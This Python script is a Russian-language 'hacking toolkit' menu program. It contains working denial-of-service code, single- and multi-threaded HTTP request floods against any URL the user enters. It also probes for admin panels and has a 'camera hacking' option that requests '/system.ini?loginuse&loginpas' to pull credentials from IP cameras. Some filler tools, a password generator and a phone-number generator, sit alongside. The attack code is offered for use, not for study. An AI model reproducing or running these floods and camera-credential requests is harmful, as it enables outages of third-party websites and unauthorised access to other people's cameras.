import time
import colorama
from colorama import Fore, Back
from art import tprint
import requests
from threading import Thread
import socket
import string
import random
import sys
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer
import time



vers = ("2.1")
obn = ("Добавили анимацию загрузки, исправили ошибки")






colorama.init()

print ('Загрузка')
s='█'
for i in range(101):
 time.sleep(0.025)
 print('\r','Загрузка',i*s,str(i),'%',end='')



print (Fore.YELLOW +  'Добро пожаловать')


 
 





print (Fore.YELLOW + "vv 0.2 ")
tprint ("VSS")
print ("ВХОД")

login = input("Логин:")
password = input("Пароль:")
if login == "noname" and password == "2248":
    print ("Доступ разрешён")
else:
    print ("Доступ заблокирован")
    exit(1)




print ("MENU:")

print (Back.BLACK + Fore.GREEN + "1. DOS Атака")
print (Back.BLACK + Fore.GREEN + "2. Посмонтреть ip по домену")
print (Back.BLACK + Fore.GREEN + "3. Просмотр html, css, java кода в ссылке")
print (Back.BLACK + Fore.GREEN + "4. Генератор  паролей")
print (Back.BLACK + Fore.GREEN + "5. Генератор номеров")
print (Back.BLACK + Fore.GREEN + "6. Многопоточный DDOS")
print (Fore.GREEN + "7. Поиск админки на сайте")
print (Fore.GREEN + "8. в разработке!")
print (Fore.GREEN + "9. HAKCAMS")
print (Fore.GREEN + "10. Доска обновлений VSS")






user = input("Введите номер действия:")

if user == "1":
    line = input("Введите URL сайта:")
    rem = requests.get(line)
    res = (rem.status_code)
    print ("Атака началась...")
    while True:
         rem = requests.get(line)
         rek = requests.get(line)
         red = requests.get(line)
         rel = requests.get(line)
         print ("Атака идёт...")
         
         

if user == "2":
    domen = input(Fore.RED + "Домен сайта:")
    ips = socket.gethostbyname_ex(domen)
    print ("ip адрес домена:", ips)

if user == "3":
    soft = input(Fore.YELLOW + "Введите URL Обьекта:")
    site = requests.get(soft).text
    print (site)
    print ("ПРОГРАММА ЗАКРОЕТСЯ ЧЕРЕЗ 10 СЕКУНД")
    time.sleep(10)

if user == "4":
    
    print (Fore.BLUE + "Загрузка password...")
    time.sleep(2)
    def generate_password(length):
        characters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(characters) for _ in range(length))
        return password
    password_length = int(input("Введите желаемую длину пароля: "))
    print ("Ваши пароли:")
    while True:
        generated_password = generate_password(password_length)
        print(generated_password)
        time.sleep(0.1)

if user == "5":
    print (Fore.YELLOW + "Загрузка генератора номеров...")
    time.sleep(2)
    while True:
         num = int(random.uniform(79021122211, 79897799988))
         nem = int(random.uniform(71212121212, 79889898989))
         print (num)
         print (nem)
         time.sleep(0.1)
    



if user == "7":
    print (Fore.YELLOW + "Поиск ADMIN панели")
    ds = ("/admin")
    ps = ("/administrator")
    ks = ("/webadmin")
    mr = ("/admin/user")
    mp = ("/admins")
    rts = ("/login")
    print ("Ответ 200 - значит админ панель найдена!")
    
    
    sl = input("Введите ссылку на сайт:")
    zap = requests.get(sl + ds)
    print (zap.status_code)
    print (sl + ds)
    zap = requests.get(sl + ps)
    print (zap.status_code)
    print (sl + ps)
    zap = requests.get(sl + ks)
    print (zap.status_code)
    print (sl + ks)
    zap = requests.get(sl + mr)
    print (zap.status_code)
    print (sl + mr)
    zap = requests.get(sl + mp)
    print (zap.status_code)
    print (sl + mp)
    zap = requests.get(sl + rts)
    print (zap.status_code)
    print (sl + rts)
    print ("Поиск закончен")
    time.sleep(35)
          
    exit()



if user == '8':
    print ("Этот пункт в разработке")
        
    exit()
    

    




if user == "9":
    print (" Взлом Камер(beta)")
    
    cam = input("Введите ссылку на камеру:")
    hak = "/system.ini?loginuse&loginpas"
    cams = requests.get(cam + hak)
    print ("Ответ камеры:")

    print (cams.status_code)
    time.sleep(4)
    exit()

if user == "10":
    
    print ("ДОСКА ОБНОВЛЕНИЙ")
    print ("Текущая версия программы:" + vers)
    print (obn)
    print ("----------------------------------------------------")
    print ("----------------------------------------------------")
    print ("Программа закроется через 10 секунд")
    time.sleep(10)
    exit()
    
    

    
    
    
    
    





if user == "6":
    url = input(Fore.RED + "URL:")
threads = int(input("Enter the number of threads: "))
print("Ok...")

def run_requests():
    
    while True:
        try:
            rem = requests.get(url)
            res = requests.post(url)
            red = requests.get(url)
            rek = requests.get(url)
            rets = requests.get(url)
            roft = requests.get(url)
            rous = requests.get(url)
        except:
            print('Что то пошло не так...')

for i in range(threads):
    t = Thread(target=run_requests)
    t.start()
    print ("Отчёт: Выполнено")
    time.sleep(1)
    






    
    


    

    
    

    
